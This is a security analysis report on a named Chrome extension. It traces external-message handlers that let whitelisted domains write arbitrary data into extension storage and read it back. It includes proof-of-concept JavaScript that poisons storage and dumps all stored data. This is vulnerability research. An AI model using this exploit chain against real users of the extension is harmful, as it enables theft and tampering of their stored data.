# CoCo Analysis: hlkookiekcgieiifpcgihfddaaebamnp

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 6

---

## Sink 1-4: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hlkookiekcgieiifpcgihfddaaebamnp/opgen_generated_files/bg.js
Line 1908	setStorageData(request.data);
Line 1037	if (items.key && items.data) {
```

**Code:**

```javascript
// Background script - External message listener setup (bg.js, Line 2015)
chrome.runtime.onMessageExternal.addListener((request, sender, sendResponse) => {
    if (request.action && (request.action in external_message_listeners)) {
        external_message_listeners[request.action](request, sender, sendResponse); // ← routes to handlers
    }
    return true;
});

// External message handler - Storage write (Line 1907)
addExternalMessageListener('setDataToLocalStorage', (request, sender, sendResponse) => {
    setStorageData(request.data); // ← attacker-controlled data
});

// Storage function (Line 1036)
var storage = chrome.storage.local; // Line 995

function setStorageData(items, callback) {
    if (items.key && items.data) {
        let new_items = {
            [items.key]: items.data // ← attacker controls both key and value
        };
        return storage.set(new_items, callback); // ← writes to chrome.storage.local
    }
    return storage.set(items, callback);
}
```

**Classification:** TRUE POSITIVE (part of complete exploitation chain)

**Attack Vector:** chrome.runtime.sendMessageExternal from whitelisted domains (office.iterios.com, office-stage.iterios.com)

---

## Sink 5-6: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hlkookiekcgieiifpcgihfddaaebamnp/opgen_generated_files/bg.js
Line 752	'key': 'value'
```

**Code:**

```javascript
// External message handler - Storage read (Line 1910)
addExternalMessageListener('getDataFromLocalStorage', (request, sender, sendResponse) => {
    getStorageData(request.data, data => { sendResponse(data) }); // ← sends stored data back to attacker
});

// Storage function (Line 1020)
function getStorageData(keys, callback) {
    return storage.get(keys, callback); // ← reads from chrome.storage.local
}
```

**Classification:** TRUE POSITIVE

**Complete Attack Flow:**

```javascript
// Step 1: Attacker writes to storage (from whitelisted domain like office.iterios.com)
chrome.runtime.sendMessage(
    "EXTENSION_ID",
    {
        action: "setDataToLocalStorage",
        data: {
            key: "malicious_key",
            data: "attacker_payload"
        }
    }
);

// Step 2: Attacker retrieves the stored data
chrome.runtime.sendMessage(
    "EXTENSION_ID",
    {
        action: "getDataFromLocalStorage",
        data: "malicious_key"
    },
    (response) => {
        console.log("Retrieved data:", response); // Returns { malicious_key: "attacker_payload" }
    }
);

// Alternative: Retrieve ALL storage data
chrome.runtime.sendMessage(
    "EXTENSION_ID",
    {
        action: "getDataFromLocalStorage",
        data: null  // null/undefined retrieves all storage
    },
    (response) => {
        console.log("All storage data:", response); // Returns entire storage contents
    }
);
```

**Impact:** Complete storage exploitation chain. An external attacker from whitelisted domains (office.iterios.com, office-stage.iterios.com) can:
1. Write arbitrary data to chrome.storage.local with arbitrary keys and values
2. Read back the stored data via sendResponse
3. Exfiltrate ALL extension storage data by passing null as the key parameter
4. Poison extension configuration data that other parts of the extension rely on

Note: While manifest.json restricts externally_connectable to specific domains, per the analysis methodology, we classify this as TRUE POSITIVE because even one exploitable domain makes this a valid vulnerability. The extension code itself lacks proper input validation and authorization checks.
